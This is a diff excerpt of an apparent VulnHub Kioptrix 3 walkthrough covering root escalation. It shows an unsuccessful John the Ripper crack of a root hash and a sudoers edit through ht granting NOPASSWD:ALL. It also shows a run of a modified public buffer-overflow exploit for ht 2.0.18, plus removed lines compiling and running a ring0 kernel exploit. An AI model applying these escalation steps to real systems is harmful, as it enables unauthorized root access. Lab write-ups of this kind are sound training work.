+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:02:59 DONE (2020-10-28 03:57) 0g/s 78766p/s 78766c/s 78766C/s  ejngyhga007..*7¡Vamos!
+Session completed
+kali@kali:~/Desktop/osc/kiol3$ sudo john --show root.hash 
+0 password hashes cracked, 1 left
+```
+Unfortunately it doesn't crack with rockyou. I take this to mean it is a dead-end. Luckily the ability to edit any file on the system means there are plenty of other things to try.
 
-100%[====================================>] 2,643         --.--K/s             
+### 7. Escalate to root
+One thing that should definately work is editing the sudoer file to allow the user to switch to root.
+```bash
+loneferret@Kioptrix3:~$ sudo ht /etc/sudoers
+```
+I then modify the sudoers line for loneferret to read NOPASSWD:ALL.  
+Note: Using Ht was a nightmare. The documentation online is very poor. By purely trial and error, I found the find/replace function mapped to Ctrl+E, and the Save function mapped to F10.
+```bash
+loneferret@Kioptrix3:~$ sudo ht /etc/sudoers
+loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: ALL
+```
+Then I can escalate my permissions to root.
+```bash
+loneferret@Kioptrix3:~$ sudo -s
+root@Kioptrix3:~# whoami
+root
+```
 
-00:49:49 (193.89 MB/s) - `ring0exploit.c' saved [2643/2643]
-
-bash-3.00$ gcc ring0exploit.c -o exploit
-gcc ring0exploit.c -o exploit
-ring0exploit.c:109:28: warning: no newline at end of file
-bash-3.00$ ./exploit
-./exploit
-sh-3.00# whoami
-whoami
+## Alternate path
+An alternate path to root exists at the user level thanks to the version of Ht which is vulnerable to a buffer overflow.
+```bash
+loneferret@Kioptrix3:~$ ht -v
+ht 2.0.18 (POSIX) 07:26:02 on Apr 16 2011
+(c) 1999-2004 Stefan Weyergraf
+(c) 1999-2009 Sebastian Biallas <sb@biallas.net>
+```
+This version is vulnerable to a buffer overflow through an argument provided to the program which overwrites EIP. There was a public exploit - https://www.exploit-db.com/exploits/17083, but it was developed for a later version of Perl from the one which was available for this machine. In order to get it working for this situation I had to modify it (see htexploit.pl). This involved removing stuff specific to other operating systems, changing the functions that were used and modifying the path argument.
+```bash
+loneferret@Kioptrix3:~$ perl htexploit.pl 
+[*]Looking for $esp and endwin()...[+]endwin() address found! (0x0804a3f8)[+]$esp place found! (0x0818138b)
+root@Kioptrix3:/home/loneferret# whoami
 root
 ```
